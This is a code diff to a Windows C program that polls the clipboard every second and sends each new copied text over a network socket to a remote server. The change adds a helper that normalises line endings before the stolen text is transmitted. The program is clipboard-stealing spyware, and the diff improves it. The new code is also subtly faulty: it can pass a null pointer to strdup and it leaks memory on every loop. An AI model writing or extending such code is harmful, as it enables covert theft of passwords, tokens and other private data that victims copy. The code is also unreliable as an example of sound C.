@@ -11,6 +11,23 @@
 
 #define SIZE sizeof(struct sockaddr_in)
 
+char* normalize_newlines(char* text) {
+    char* result = strdup(text);
+    char* src = text;
+    char* dest = result;
+
+    while (*src) {
+        if (*src == '\r') { 
+            src++;  // Skip '\r' character
+            if (*src != '\n') *dest++ = '\n';  // Convert to '\n' if not followed by '\n'
+        } else {
+            *dest++ = *src++;
+        }
+    }
+    *dest = '\0';
+    return result;
+}
+
 char* get_clipboard_text() {
     if (!OpenClipboard(NULL))
         return NULL;
@@ -82,10 +99,11 @@ int main(int argc, char** argv) {
     /* send information to the server */
     for (;;) {
         char* new_data = get_clipboard_text();
+        char* normalized_data = normalize_newlines(new_data);
 
-        if (copied_data == NULL || (new_data != NULL && strcmp(new_data, copied_data) != 0)) {
-            printf("\nTransmitting Data to Server: %s\n", new_data);
-            ssize_t bytes_sent = send(sockfd, new_data, strlen(new_data), 0);
+        if (copied_data == NULL || (normalized_data != NULL && strcmp(normalized_data, copied_data) != 0)) {
+            printf("\nTransmitting Data to Server: %s\n", normalized_data);
+            ssize_t bytes_sent = send(sockfd, normalized_data, strlen(normalized_data), 0);
             if (bytes_sent == SOCKET_ERROR) {
                 perror("send failed");
                 closesocket(sockfd);
@@ -93,7 +111,7 @@ int main(int argc, char** argv) {
                 return 1;
             }
             free(copied_data);
-            copied_data = strdup(new_data);
+            copied_data = strdup(normalized_data);
         }
         Sleep(1000);  // Sleep for 1 second (1000 milliseconds)
     }
